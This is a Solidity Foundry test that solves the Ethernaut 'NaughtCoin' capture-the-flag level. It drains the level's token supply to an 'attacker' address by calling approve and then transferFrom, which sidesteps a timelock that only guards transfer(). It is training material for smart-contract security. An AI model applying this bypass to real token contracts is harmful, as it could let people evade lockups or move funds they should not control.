//SPDX-Lincense-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinHackTest is DSTest {
    //state variables
    Vm vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    address attacker = payable(address(0xbabe));
    //uint public INITIAL_SUPPLY = 1000000 * (10**uint256(18));
    
    //setup state variables
    function setUp() public {
        ethernaut = new Ethernaut();
        
    }

    //level setup, attack and submission
    function testNaughtCoinHack() public {
        //LEVEL SETUP
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);

        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin naughtCoinContract = NaughtCoin(payable(levelAddress));
       

        //LEVEL ATTACK
       naughtCoinContract.approve(tx.origin, (1000000 * (10**uint256(18))));
       naughtCoinContract.transferFrom(tx.origin, attacker, (1000000 * (10**uint256(18))));
       

        //LEVEL SUBMISSION
       
        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

}
